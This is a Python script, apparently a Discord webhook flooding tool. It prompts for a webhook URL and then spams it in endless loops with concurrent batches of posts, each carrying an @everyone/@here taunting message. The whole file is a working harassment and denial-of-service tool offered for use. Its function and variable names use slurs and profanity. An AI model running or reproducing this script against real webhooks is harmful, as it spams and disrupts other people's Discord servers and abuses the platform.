import requests
import asyncio
import aiohttp
import discord_webhook # release the fucking epstein files
import json
import functions

# SKIP TONS OF SHIT













# ok stop tripping
async def xenofuck(webh2ook):
    wenjppl = webh2ook
    try:
        while True:
            thejson = {
                "content": "@everyone @here @everyone @here\n-# Bro getting Discord Webhook destroyed in the Big 25 is crazy..\nSomeone just used the most basic Webhook Diddler ever on the Xeno tool just to destroy your webhook.\nGet fucking protection, losers.\nWebhook diddled by someone.. "
            }
            requests.post(webh2ook, json=thejson)
            await aiohttp.request(
                method="POST",
                url=webh2ook,
                json=thejson
            )
            requests.post(webh2ook, json=thejson)
            await aiohttp.request(
                method="POST",
                url=webh2ook,
                json=thejson
            )
            await asyncio.sleep(0.4)
    except Exception as _:
        return await xenofuck(wenjppl)
    
fuckingwebhookurl = functions.retardinput(False, "ENTER THE FUCKING WEBHOOK URL: ")

async def hello(tshook):
    while True:
        for i in range(0, 100, 25):
            await asyncio.gather(*[xenofuck(tshook) for j in range(i, i + 25)])
            await asyncio.gather(*[xenofuck(tshook) for j in range(i, i + 25)])
            await asyncio.gather(*[xenofuck(tshook) for j in range(i, i + 25)])
            await asyncio.gather(*[xenofuck(tshook) for j in range(i, i + 25)])
            await asyncio.gather(*[xenofuck(tshook) for j in range(i, i + 25)])
            await asyncio.sleep(8.2)
            await asyncio.gather(*[xenofuck(tshook) for j in range(i, i + 25)])
            await asyncio.gather(*[xenofuck(tshook) for j in range(i, i + 25)])
            await asyncio.gather(*[xenofuck(tshook) for j in range(i, i + 25)])
            await asyncio.gather(*[xenofuck(tshook) for j in range(i, i + 25)])
            await asyncio.gather(*[xenofuck(tshook) for j in range(i, i + 25)])
            await asyncio.sleep(15.5)
            await asyncio.gather(*[xenofuck(tshook) for j in range(i, i + 25)])
            await asyncio.gather(*[xenofuck(tshook) for j in range(i, i + 25)])
            await asyncio.gather(*[xenofuck(tshook) for j in range(i, i + 25)])
            await asyncio.gather(*[xenofuck(tshook) for j in range(i, i + 25)])
            await asyncio.gather(*[xenofuck(tshook) for j in range(i, i + 25)])
            functions.retardprint(True, "Cooldown for 30 seconds to make sure webhook doesnt die...")
            await asyncio.sleep(30)
            functions.retardprint(False, "Cooldown ended!")


asyncio.run(hello(fuckingwebhookurl))